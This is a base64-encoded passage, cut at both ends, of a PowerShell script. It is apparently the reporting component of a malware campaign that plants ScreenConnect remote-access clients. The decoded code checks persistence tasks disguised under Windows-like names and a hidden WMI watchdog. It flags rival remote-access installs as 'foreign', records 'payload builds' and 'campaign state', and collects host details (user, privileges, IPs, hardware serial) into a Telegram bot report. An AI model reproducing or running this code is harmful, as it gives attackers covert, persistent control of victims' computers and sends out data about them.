dC1JdGVtUHJvcGVydHkgJHBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
YWNoLU9iamVjdCB7DQogICAgICAgICAgICAkZG4gPSAkXy5EaXNwbGF5TmFtZQ0KICAgICAgICAg
ICAgaWYgKC1ub3QgJGRuKSB7IHJldHVybiB9DQogICAgICAgICAgICBpZiAoVGVzdC1LZWVwTmFt
ZSAkZG4pIHsNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICcqRGF0dG8qJyAtb3IgJGRu
IC1saWtlICcqQ2VudHJhU3RhZ2UqJykgeyBBZGQtSGl0ICdrZWVwLWRhdHRvJyAkZG4gfQ0KICAg
ICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRkbiAt
bGlrZSAnU2NyZWVuQ29ubmVjdConKSB7IHJldHVybiB9DQogICAgICAgICAgICBmb3JlYWNoICgk
dCBpbiAkdG9rZW5zKSB7DQogICAgICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAiKiR0KiIpIHsN
CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAnbXNpJyAkZG4NCiAgICAgICAgICAgICAgICAg
ICAgYnJlYWsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAg
ICB9DQoNCiAgICByZXR1cm4gJGhpdHMNCn0NCg0KZnVuY3Rpb24gR2V0LVNjSW5zdGFsbHMgew0K
ICAgICRsaXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0
cmluZ10NCiAgICBHZXQtU2VydmljZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdo
ZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgfSB8IEZv
ckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJGZwID0gaWYgKCRfLk5hbWUgLW1hdGNoICdcKChbMC05
YS1mXXsxNn0pXCknKSB7ICRtYXRjaGVzWzFdIH0gZWxzZSB7ICc/JyB9DQogICAgICAgICR0YWcg
PSBpZiAoJGZwIC1lcSAnNWY2MDEwNTc5ODUyZTUwNycpIHsgJ0tFRVAtUFJJTUFSWScgfQ0KICAg
ICAgICBlbHNlaWYgKCRmcCAtZXEgJ2Y4NjFjODE0MGQ0NTM0MjcnKSB7ICdLRUVQLUFMVCcgfQ0K
ICAgICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0NCiAgICAgICAgW3ZvaWRdJGxpc3QuQWRkKCgnLSA8
Y29kZT57MH08L2NvZGU+OiA8Yj57MX08L2I+IFt7Mn1dJyAtZiAoRXNjICRfLk5hbWUpLCAoRXNj
IChbc3RyaW5nXSRfLlN0YXR1cykpLCAkdGFnKSkNCiAgICB9DQoNCiAgICAkcm9vdHMgPSBAKA0K
ICAgICAgICAiJHtlbnY6UHJvZ3JhbUZpbGVzfVxTY3JlZW5Db25uZWN0IENsaWVudCoiLA0KICAg
ICAgICAiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiINCiAg
ICApDQogICAgZm9yZWFjaCAoJHBhdCBpbiAkcm9vdHMpIHsNCiAgICAgICAgR2V0LUNoaWxkSXRl
bSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBG
b3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIHBhdGg6IDxj
b2RlPnswfTwvY29kZT4nIC1mIChFc2MgJF8uRnVsbE5hbWUpKSkNCiAgICAgICAgfQ0KICAgIH0N
Cg0KICAgICR1bmluc3QgPSBAKA0KICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdp
bmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXConLA0KICAgICAgICAnSEtMTTpcU09GVFdB
UkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxs
XConDQogICAgKQ0KICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsNCiAgICAgICAgR2V0
LUl0ZW1Qcm9wZXJ0eSAkcGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJl
LU9iamVjdCB7DQogICAgICAgICAgICAkXy5EaXNwbGF5TmFtZSAtbGlrZSAnKlNjcmVlbkNvbm5l
Y3QqJw0KICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgJHZlciA9IGlm
ICgkXy5EaXNwbGF5VmVyc2lvbikgeyAkXy5EaXNwbGF5VmVyc2lvbiB9IGVsc2UgeyAnPycgfQ0K
ICAgICAgICAgICAgW3ZvaWRdJGxpc3QuQWRkKCgnLSBtc2k6IDxjb2RlPnswfTwvY29kZT4gdnsx
fScgLWYgKEVzYyAkXy5EaXNwbGF5TmFtZSksIChFc2MgJHZlcikpKQ0KICAgICAgICB9DQogICAg
fQ0KDQogICAgaWYgKCRsaXN0LkNvdW50IC1lcSAwKSB7IFt2b2lkXSRsaXN0LkFkZCgnLSAobm9u
ZSknKSB9DQogICAgcmV0dXJuICRsaXN0DQp9DQoNCiRjZmcgPSBHZXQtQ2ZnDQppZiAoLW5vdCAk
Y2ZnLkJPVF9UT0tFTiAtb3IgLW5vdCAkY2ZnLkNIQVRfSUQpIHsNCiAgICBBZGQtQ29udGVudCAt
TGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInKSAtVmFsdWUgJ3RnX3Nr
aXBfbm9fY2ZnJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIGV4aXQgMg0KfQ0K
DQokcHJpbSA9ICdTY3JlZW5Db25uZWN0IENsaWVudCAoNWY2MDEwNTc5ODUyZTUwNyknDQokYWx0
ID0gJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IChmODYxYzgxNDBkNDUzNDI3KScNCiRvcyA9IEdldC1P
c0luZm8NCiR3aG8gPSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1
cnJlbnQoKS5OYW1lDQokZWxldiA9IChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NQcmluY2lw
YWxdW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLklz
SW5Sb2xlKA0KICAgIFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRt
aW5pc3RyYXRvcikNCiRpc1N5c3RlbSA9ICR3aG8gLWxpa2UgJypTWVNURU0qJyAtb3IgJHdobyAt
ZXEgJ05UIEFVVEhPUklUWVxTWVNURU0nDQoNCiRtc2lDYWNoZSA9IEpvaW4tUGF0aCAkV29ya0Rp
ciAncGtnLm1zaScNCiRtc2lTaXplID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsNCiAgICAn
ezA6TjB9IEtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2UpLkxlbmd0aCAvIDFLQikN
Cn0gZWxzZSB7ICdub25lJyB9DQoNCiRtb25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25f
bW9uLmNtZCcNCiRldGxNb24gPSAiJGVudjpQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25vc2lz
XFN0YXRlXC5ldGxjYWNoZVxldGxfbW9uLmNtZCINCiRoYXNNb24gPSBUZXN0LVBhdGggJG1vblBh
dGgNCiRoYXNFdGwgPSBUZXN0LVBhdGggJGV0bE1vbg0KDQojIFQxMDogb24tZGlzayBwYXlsb2Fk
IGJ1aWxkIG1hcmtlcnMgLT4gZXZlcnkgcmVwb3J0IHByb3ZlcyBleGFjdGx5IHdoYXQgaXMgaW5z
dGFsbGVkDQpmdW5jdGlvbiBHZXQtUGF5bG9hZEJ1aWxkKFtzdHJpbmddJGZpbGUpIHsNCiAgICBp
ZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkgeyByZXR1cm4gJ21pc3NpbmcnIH0NCiAgICBmb3Jl
YWNoICgkbCBpbiAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRmaWxlIC1Ub3RhbENvdW50IDgg
LUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0KICAgICAgICBpZiAoJGwg
LW1hdGNoICdCVUlMRFxzK1xkezh9KFtBLVpdK1xkKyknKSB7IHJldHVybiAkbWF0Y2hlc1sxXSB9
DQogICAgfQ0KICAgIHJldHVybiAnPycNCn0NCiRiTW9uID0gR2V0LVBheWxvYWRCdWlsZCAoSm9p
bi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcpDQokYlNlYyA9IEdldC1QYXlsb2FkQnVpbGQg
KEpvaW4tUGF0aCAkV29ya0RpciAnb3duX3NlY3VyZS5jbWQnKQ0KJGJUZ3IgPSBHZXQtUGF5bG9h
ZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ3RnX3JlcG9ydC5wczEnKQ0KJGJMaWIgPSBHZXQt
UGF5bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIucHMxJykNCg0KIyBwZXIt
aG9zdCBpZGVudGl0eTogZXhwZWN0ZWQgdGFzayBuYW1lcyBjb21lIGZyb20gaWRlbnRpdHkuY2Zn
IHdoZW4gcHJlc2VudA0KJGlkQ2ZnID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5jZmcn
DQokaWRNYXAgPSBAe30NCmlmIChUZXN0LVBhdGggJGlkQ2ZnKSB7DQogICAgR2V0LUNvbnRlbnQg
LUxpdGVyYWxQYXRoICRpZENmZyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgaWYgKCRfIC1t
YXRjaCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZE1hcFskbWF0Y2hlc1sx
XV0gPSAkbWF0Y2hlc1syXSB9DQogICAgfQ0KfQ0KJGV4cGVjdGVkVGFza3MgPSBAKA0KICAgIEB7
IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19BKSB7ICRpZE1hcC5UQVNLX0EgfSBlbHNlIHsgJ1xX
ZXJRdWV1ZVN5bmMnIH0pOyBSb2xlID0gInRpY2sgJCgkaWRNYXAuTU9fQSltIChjaGFpbjEpIiB9
LA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19CKSB7ICRpZE1hcC5UQVNLX0IgfSBl
bHNlIHsgJ1xQbGFTZXJ2ZXJIZWFsdGgnIH0pOyBSb2xlID0gImJhY2t1cCAkKCRpZE1hcC5NT19C
KW0gKGNoYWluMSkiIH0sDQogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0MpIHsgJGlk
TWFwLlRBU0tfQyB9IGVsc2UgeyAnXFdkaUhvc3RQcm94eScgfSk7IFJvbGUgPSAnT05TVEFSVCAo
Y2hhaW4xKScgfSwNCiAgICBAeyBOYW1lID0gJChpZiAoJGlkTWFwLlRBU0tfRCkgeyAkaWRNYXAu
VEFTS19EIH0gZWxzZSB7ICdcVGNwSXBDb25mbGljdFJlcycgfSk7IFJvbGUgPSAnT05MT0dPTiAo
Y2hhaW4xKScgfQ0KKQ0KIyBjaGFpbiAyOiBXTUkgd2F0Y2hkb2cgc3Vic2NyaXB0aW9uDQokd21p
QyA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29t
bWFuZExpbmVFdmVudENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAt
RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KJGV4cGVjdGVkVGFza3MgKz0gQHsgTmFtZSA9
ICdcV01JXFd1Y2FjaGVXYXRjaGRvZ0MnOyBSb2xlID0gJ3RpbWVyIDNtIChjaGFpbjIpJzsgV21p
ID0gKCRudWxsIC1uZSAkd21pQykgfQ0KDQokdGFza0xpbmVzID0gTmV3LU9iamVjdCBTeXN0ZW0u
Q29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ10NCiR0YXNrT2sgPSAwDQokdGFza0JhZCA9
IDANCmZvcmVhY2ggKCR0IGluICRleHBlY3RlZFRhc2tzKSB7DQogICAgaWYgKCR0LkNvbnRhaW5z
S2V5KCdXbWknKSkgew0KICAgICAgICBpZiAoJHQuV21pKSB7ICR0YXNrT2srKzsgJG1hcmsgPSAn
T0snIH0gZWxzZSB7ICR0YXNrQmFkKys7ICRtYXJrID0gJ01JU1NJTkcnIH0NCiAgICAgICAgW3Zv
aWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwvY29kZT4gLSB7Mn0nIC1mICRt
YXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNjICR0LlJvbGUpKSkNCiAgICAgICAgY29udGludWUNCiAg
ICB9DQogICAgJGggPSBHZXQtVGFza0hlYWx0aCAkdC5OYW1lDQogICAgaWYgKCRoLlByZXNlbnQg
LWFuZCAkaC5IZWFsdGh5KSB7DQogICAgICAgICR0YXNrT2srKw0KICAgICAgICAkbWFyayA9ICdP
SycNCiAgICB9IGVsc2VpZiAoJGguUHJlc2VudCAtYW5kIC1ub3QgJGguT3Vycykgew0KICAgICAg
ICAkdGFza0JhZCsrDQogICAgICAgICRtYXJrID0gJ05PVF9PVVJTJw0KICAgIH0gZWxzZWlmICgk
aC5QcmVzZW50KSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1hcmsgPSAnV0VBSycN
CiAgICB9IGVsc2Ugew0KICAgICAgICAkdGFza0JhZCsrDQogICAgICAgICRtYXJrID0gJ01JU1NJ
TkcnDQogICAgfQ0KICAgICRleHRyYSA9ICcnDQogICAgaWYgKCRoLlByZXNlbnQpIHsNCiAgICAg
ICAgJGJpdHMgPSBAKCkNCiAgICAgICAgaWYgKCRoLlN0YXR1cykgeyAkYml0cyArPSAkaC5TdGF0
dXMgfQ0KICAgICAgICBpZiAoJGguUmVzdWx0IC1uZSAnJyAtYW5kICRoLlJlc3VsdCAtbmUgJzAn
KSB7ICRiaXRzICs9ICgiTGFzdFJlc3VsdD0iICsgJGguUmVzdWx0KSB9DQogICAgICAgIGlmICgk
Yml0cy5Db3VudCkgeyAkZXh0cmEgPSAnICgnICsgKCRiaXRzIC1qb2luICcsICcpICsgJyknIH0N
CiAgICB9DQogICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwvY29k
ZT4gLSB7Mn17M30nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNjICR0LlJvbGUpLCAoRXNj
ICRleHRyYSkpKQ0KfQ0KDQokcHJpbUxpbmUgPSBHZXQtU3ZjTGluZSAkcHJpbQ0KJGFsdExpbmUg
PSBHZXQtU3ZjTGluZSAkYWx0DQokcHJpbU9rID0gJHByaW1MaW5lIC1saWtlICdSdW5uaW5nKicN
CiRkZXBsb3lPayA9ICRwcmltT2sgLWFuZCAoJHRhc2tPayAtZ2UgMykgLWFuZCAkaGFzTW9uDQoN
CiRlbW9qaU1hcCA9IEB7DQogICAgT0sgICAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3MDUpDQog
ICAgRE9XTiAgICAgPSAoW3N0cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjZBOCkp
DQogICAgUkVTVE9SRUQgPSAoW3N0cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjdF
MikpDQogICAgRkFJTCAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3NEMpDQogICAgRk9SQ0UgICAg
PSBbc3RyaW5nXShbY2hhcl0weDI2QTEpDQogICAgREVQTE9ZICAgPSAoW3N0cmluZ11bY2hhcl06
OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjY4MCkpDQogICAgSEIgICAgICAgPSAoW3N0cmluZ11bY2hh
cl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRFMSkpDQp9DQoka2V5ID0gJFN0YXRlLlRvVXBwZXJJ
bnZhcmlhbnQoKQ0KJGVtb2ppID0gaWYgKCRlbW9qaU1hcC5Db250YWluc0tleSgka2V5KSkgeyAk
ZW1vamlNYXBbJGtleV0gfSBlbHNlIHsgKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMy
KDB4MUY0RjEpKSB9DQoNCiR0aXRsZSA9IHN3aXRjaCAoJGtleSkgew0KICAgICdPSycgeyAnUHJp
bWFyeSBoZWFsdGh5JyB9DQogICAgJ0RPV04nIHsgJ1ByaW1hcnkgRE9XTiAtIGhlYWxpbmcnIH0N
CiAgICAnUkVTVE9SRUQnIHsgJ1ByaW1hcnkgUkVTVE9SRUQnIH0NCiAgICAnRkFJTCcgeyAnSGVh
bCBGQUlMRUQnIH0NCiAgICAnRk9SQ0UnIHsgJ0ZvcmNlZCByZWluc3RhbGwnIH0NCiAgICAnREVQ
TE9ZJyB7IGlmICgkZGVwbG95T2spIHsgJ0ZJUlNUIERFUExPWSBPSycgfSBlbHNlIHsgJ0ZJUlNU
IERFUExPWSAtIENIRUNLIE5FRURFRCcgfSB9DQogICAgJ0hCJyB7ICdob3VybHkgZGlnZXN0JyB9
DQogICAgZGVmYXVsdCB7ICJTdGF0ZTogJFN0YXRlIiB9DQp9DQoNCiR0cmFucyA9IGlmICgkT2xk
U3RhdGUpIHsgIiRPbGRTdGF0ZSAtPiAkU3RhdGUiIH0gZWxzZSB7ICRTdGF0ZSB9DQokc2NMaXN0
ID0gR2V0LVNjSW5zdGFsbHMNCiRybW1IaXRzID0gR2V0LVJtbUhpdHMNCmlmICgkcm1tSGl0cy5D
b3VudCAtZXEgMCkgeyBbdm9pZF0kcm1tSGl0cy5BZGQoJy0gKG5vbmUgZGV0ZWN0ZWQpJykgfQ0K
DQokcHViID0gR2V0LVB1YmxpY0lwDQokbGFuID0gR2V0LUxvY2FsSXBzDQokbm93ID0gR2V0LURh
dGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcyB6enonDQokdXB0aW1lID0gJ24vYScNCnRy
eSB7DQogICAgJGJvb3QgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX09wZXJhdGluZ1N5c3RlbSku
TGFzdEJvb3RVcFRpbWUNCiAgICAkdXB0aW1lID0gJ3swOmRkfWQgezA6aGh9aCB7MDptbX1tJyAt
ZiAoKEdldC1EYXRlKSAtICRib290KQ0KfSBjYXRjaCB7fQ0KDQojIGNhbXBhaWduIHN0YXRlIGZp
bGUgKHdyaXR0ZW4gYnkgb3duX2xpYi5wczEgc3RhdGUgYWN0aW9uKQ0KJHN0YXRlTGluZSA9ICdu
L2EnDQokc3RhdGVPYmogPSAkbnVsbA0KJHN0YXRlUGF0aDIgPSBKb2luLVBhdGggJFdvcmtEaXIg
J3N0YXRlLmpzb24nDQppZiAoVGVzdC1QYXRoICRzdGF0ZVBhdGgyKSB7DQogICAgJHJhd1N0YXRl
ID0gKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoMiAtUmF3KS5UcmltKCkNCiAg
ICB0cnkgew0KICAgICAgICAkc3RhdGVPYmogPSAkcmF3U3RhdGUgfCBDb252ZXJ0RnJvbS1Kc29u
DQogICAgICAgICRmb3JlaWduQ3N2ID0gaWYgKCRzdGF0ZU9iai5mb3JlaWduKSB7ICgkc3RhdGVP
YmouZm9yZWlnbiAtam9pbiAnLCcpIH0gZWxzZSB7ICctJyB9DQogICAgICAgICRzdGF0ZUxpbmUg
PSAicHJpbT0kKCRzdGF0ZU9iai5wcmltKSBhbHQ9JCgkc3RhdGVPYmouYWx0KSBmb3JlaWduPVsk
Zm9yZWlnbkNzdl0gdGFza3M9JCgkc3RhdGVPYmoudGFza3NPaykvJCgkc3RhdGVPYmoudGFza3NU
b3RhbCkgd2Q9JCgkc3RhdGVPYmoud2F0Y2hkb2cpIGhlYWxzPSQoJHN0YXRlT2JqLmluc3RhbGxD
b3VudCkiDQogICAgfSBjYXRjaCB7ICRzdGF0ZUxpbmUgPSAkcmF3U3RhdGUgfQ0KfQ0KDQokZGVw
bG95QmxvY2sgPSAnJw0KaWYgKCRrZXkgLWVxICdERVBMT1knKSB7DQogICAgJHZlcmRpY3QgPSBp
ZiAoJGRlcGxveU9rKSB7ICdERVBMT1lFRCAvIEhFQUxUSFknIH0gZWxzZSB7ICdERVBMT1lFRCBC
VVQgSU5DT01QTEVURScgfQ0KICAgICRmb3JlaWduID0gQChHZXQtQ2hpbGRJdGVtIC1QYXRoICIk
e2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxTY3JlZW5Db25uZWN0IENsaWVudCoiIC1EaXJlY3RvcnkgLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1ub3Rt
YXRjaCAnNWY2MDEwNTc5ODUyZTUwN3xmODYxYzgxNDBkNDUzNDI3JyB9KQ0KICAgICRkaWFnTGlu
ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0K
ICAgICRib290UGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQogICAgaWYgKFRl
c3QtUGF0aCAkYm9vdFBhdGgpIHsNCiAgICAgICAgJGludGVyZXN0aW5nID0gQCgNCiAgICAgICAg
ICAgICdtc2lfJywgJ2ZldGNoXycsICdwcmltYXJ5XycsICdudWtlXycsICdtc2lfdG9vJywgJ21z
aV9mZXRjaCcsICdtc2lfZXhpdCcsDQogICAgICAgICAgICAnbXNpX3VuYXZhaWxhYmxlJywgJ3Nl
Y3VyZV8nLCAnZ29fJywgJ2V4dGVybWluYXRlXycsICdpZGVudGl0eV8nLA0KICAgICAgICAgICAg
J2NyZWF0ZV90YXNrJywgJ3ZlcmlmeV90YXNrJywgJ29ycGhhbl8nLCAnc3RhbGVfJywgJ3Bvc3Rp
bnN0YWxsJywgJ2FsdF8nDQogICAgICAgICkNCiAgICAgICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQ
YXRoICRib290UGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAg
ICBXaGVyZS1PYmplY3Qgew0KICAgICAgICAgICAgICAgICRsaW5lID0gJF8NCiAgICAgICAgICAg
ICAgICBmb3JlYWNoICgkdCBpbiAkaW50ZXJlc3RpbmcpIHsgaWYgKCRsaW5lIC1saWtlICIqJHQq
IikgeyByZXR1cm4gJHRydWUgfSB9DQogICAgICAgICAgICAgICAgJGZhbHNlDQogICAgICAgICAg
ICB9IHwNCiAgICAgICAgICAgIFNlbGVjdC1PYmplY3QgLUxhc3QgMjYgfA0KICAgICAgICAgICAg
Rm9yRWFjaC1PYmplY3QgeyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgoJy0gPGNvZGU+ezB9PC9jb2Rl
PicgLWYgKEVzYyAoJF8gLXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/JykpKSkgfQ0KICAgIH0N
CiAgICBpZiAoJGRpYWdMaW5lcy5Db3VudCAtZXEgMCkgeyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgn
LSAobm8gaW5zdGFsbC9udWtlIG1hcmtlcnMgaW4gYm9vdC5lcnIpJykgfQ0KICAgICRkZXBsb3lC
bG9jayA9IEAiDQoNCjxiPkRlcGxveSB2ZXJkaWN0PC9iPg0KLSBSZXN1bHQ6IDxiPiQoRXNjICR2
ZXJkaWN0KTwvYj4NCi0gUHJpbWFyeSBSdW5uaW5nOiAkKGlmICgkcHJpbU9rKSB7ICdZRVMnIH0g
ZWxzZSB7ICdOTycgfSkNCi0gTW9uaXRvciBzY3JpcHQgKC53dWNhY2hlXG93bl9tb24uY21kKTog
JChpZiAoJGhhc01vbikgeyAnWUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIEJhY2t1cCBtb24gKC5l
dGxjYWNoZVxldGxfbW9uLmNtZCk6ICQoaWYgKCRoYXNFdGwpIHsgJ1lFUycgfSBlbHNlIHsgJ05P
JyB9KQ0KLSBQZXJzaXN0IHRhc2tzIE9LOiAkdGFza09rIC8gJCgkZXhwZWN0ZWRUYXNrcy5Db3Vu
dCkgKGJhZC9taXNzaW5nOiAkdGFza0JhZCkNCi0gTVNJIGNhY2hlOiAkKEVzYyAkbXNpU2l6ZSkN
Ci0gRm9yZWlnbiBTQyBmb2xkZXJzIGxlZnQ6ICQoJGZvcmVpZ24uQ291bnQpDQotIE5vdGU6IExh
c3RSZXN1bHQgMjY3MDExID0gdGFzayBub3QgeWV0IHJ1biAobm9ybWFsIHJpZ2h0IGFmdGVyIGNy
ZWF0ZSkNCg0KPGI+RGVwbG95IGxvZyBtYXJrZXJzPC9iPg0KJCgkZGlhZ0xpbmVzIC1qb2luICJg
biIpDQoiQA0KfQ0KDQokdGV4dCA9IEAiDQokZW1vamkgPGI+U0MgTW9uaXRvciAtICQoRXNjICR0
aXRsZSk8L2I+DQoNCjxiPkV2ZW50PC9iPg0KLSBTdW1tYXJ5OiAkKEVzYyAkU3VtbWFyeSkNCi0g
VHJhbnNpdGlvbjogPGNvZGU+JChFc2MgJHRyYW5zKTwvY29kZT4NCi0gV2hlbjogJChFc2MgJG5v
dykNCi0gU291cmNlIGJ1aWxkOiA8Y29kZT4kKEVzYyAkQnVpbGQpPC9jb2RlPg0KJGRlcGxveUJs
b2NrDQoNCjxiPkhvc3Q8L2I+DQotIENvbXB1dGVyOiA8Y29kZT4kKEVzYyAkZW52OkNPTVBVVEVS
TkFNRSk8L2NvZGU+DQotIFVzZXI6IDxjb2RlPiQoRXNjICR3aG8pPC9jb2RlPg0KLSBFbGV2YXRl
ZDogJGVsZXYgfCBTWVNURU06ICRpc1N5c3RlbQ0KLSBEb21haW4vV29ya2dyb3VwOiAkKEVzYyAk
b3MuRG9tYWluKQ0KDQo8Yj5OZXR3b3JrPC9iPg0KLSBMQU4gSVBzOiA8Y29kZT4kKEVzYyAkbGFu
KTwvY29kZT4NCi0gUHVibGljIElQOiA8Y29kZT4kKEVzYyAkcHViKTwvY29kZT4NCg0KPGI+T1Mg
LyBIYXJkd2FyZTwvYj4NCi0gT1M6ICQoRXNjICRvcy5DYXB0aW9uKQ0KLSBWZXJzaW9uOiAkKEVz
YyAkb3MuVmVyc2lvbikgKGJ1aWxkICQoRXNjICRvcy5CdWlsZCkpICQoRXNjICRvcy5BcmNoKQ0K
LSBJbnN0YWxsOiAkKEVzYyAkb3MuSW5zdGFsbERhdGUpIHwgTGFzdCBib290OiAkKEVzYyAkb3Mu
TGFzdEJvb3QpDQotIFVwdGltZTogJChFc2MgJHVwdGltZSkNCi0gQ1BVOiAkKEVzYyAkb3MuQ1BV
KQ0KLSBIYXJkd2FyZTogJChFc2MgJG9zLk1hbnVmYWN0dXJlcikgJChFc2MgJG9zLk1vZGVsKQ0K
LSBTZXJpYWw6IDxjb2RlPiQoRXNjICRvcy5TZXJpYWwpPC9jb2RlPg0KLSBSQU06ICQoJG9zLlRv
dGFsUkFNX0dCKSBHQg0KLSBEaXNrIEM6ICQoJG9zLkRpc2tGcmVlX0dCKSBHQiBmcmVlIC8gJCgk
b3MuRGlza1NpemVfR0IpIEdCDQoNCjxiPlNjcmVlbkNvbm5lY3QgKGFsbCk8L2I+DQotIFByaW1h
cnkgPGNvZGU+NWY2MDEwNTc5ODUyZTUwNzwvY29kZT46ICQoRXNjICRwcmltTGluZSkNCi0gQWx0
IDxjb2RlPmY4NjFjODE0MGQ0NTM0Mjc8L2NvZGU+OiAkKEVzYyAkYWx0TGluZSkNCiQoJHNjTGlz
dCAtam9pbiAiYG4iKQ0KDQo8Yj5PdGhlciBSTU0gLyByZW1vdGUgdG9vbHM8L2I+DQokKCRybW1I
aXRzIC1qb2luICJgbiIpDQoNCjxiPlBlcnNpc3QgdGFza3MgKGV4cGVjdGVkKTwvYj4NCiQoJHRh
c2tMaW5lcyAtam9pbiAiYG4iKQ0KDQo8Yj5DYWNoZTwvYj4NCi0gTVNJIGNhY2hlOiAkKEVzYyAk
bXNpU2l6ZSkNCi0gV29ya0RpcjogPGNvZGU+JChFc2MgJFdvcmtEaXIpPC9jb2RlPg0KDQo8Yj5Q
YXlsb2FkIGJ1aWxkcyAoaW5zdGFsbGVkIG9uIHRoaXMgaG9zdCk8L2I+DQotIDxjb2RlPk1PTj0k
Yk1vbiB8IFNFQz0kYlNlYyB8IFRHUj0kYlRnciB8IExJQj0kYkxpYjwvY29kZT4NCg0KPGI+Q2Ft
cGFpZ24gc3RhdGU8L2I+DQotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUpPC9jb2RlPg0KDQo8aT5C
b3Q6IEBub2J1ZGR5cm1tQm90IHwgVEdfUkVQT1JUICRiVGdyPC9pPg0KIkANCg0KIyBjb21wYWN0
